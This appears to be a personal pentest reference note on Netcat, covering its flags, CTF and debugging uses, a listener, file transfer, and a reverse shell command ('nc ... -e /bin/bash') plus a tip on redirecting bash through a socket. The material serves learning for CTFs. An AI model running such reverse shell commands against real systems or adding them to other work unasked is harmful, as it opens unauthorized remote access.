#### Official Documentation: [https://netcat.sourceforge.net/](https://netcat.sourceforge.net/)
#### Cheat Sheet: [[Kali Tools#Netcat|Netcat Commands]]
## Purpose
Netcat (nc) is a networking utility for reading/writing data across TCP/UDP. It’s called the “Swiss Army Knife” of networking because it supports port scanning, file transfer, and reverse/bind shells.

## Scenarios
- CTF: Spawn a reverse shell from a vulnerable machine to your listener.  
- Real world: Debug network services, test connectivity, or set up a quick data transfer channel.

## All needed info to run
- Syntax: `nc [options] host port`.  
- Common flags:
  - `-l` → listen mode  
  - `-p <port>` → specify port  
  - `-v` → verbose  
  - `-n` → numeric IPs only  
  - `-u` → UDP mode  
  - `-e <program>` → execute program after connection (disabled in some builds; use traditional netcat or Ncat)  
- Works as listener or client.  
- Supports piping and redirection.

## Example commands & outputs
```bash
# Listener (server)
$ nc -lvnp 4444
listening on [any] 4444 ...

# Connect to listener
$ nc 192.168.56.1 4444
# Connection established, data typed on one side appears on the other

# Reverse shell (target side)
$ nc 192.168.56.1 4444 -e /bin/bash

# File transfer
# Sender
$ nc -l -p 1234 < file.txt
# Receiver
$ nc 192.168.56.1 1234 > file.txt
```

!!! note "Netcat Basics"
	- `-e` for shells may be disabled; use `/bin/bash <&3 >&3` tricks or Socat instead.
	- Always specify `-v` for clarity in CTFs.
	- Use piping (`|`) and redirection for quick file transfers.
	- Treat Netcat shells as unstable — use for initial foothold, then upgrade.


### [[Kali Tools#Netcat|Netcat Commands]]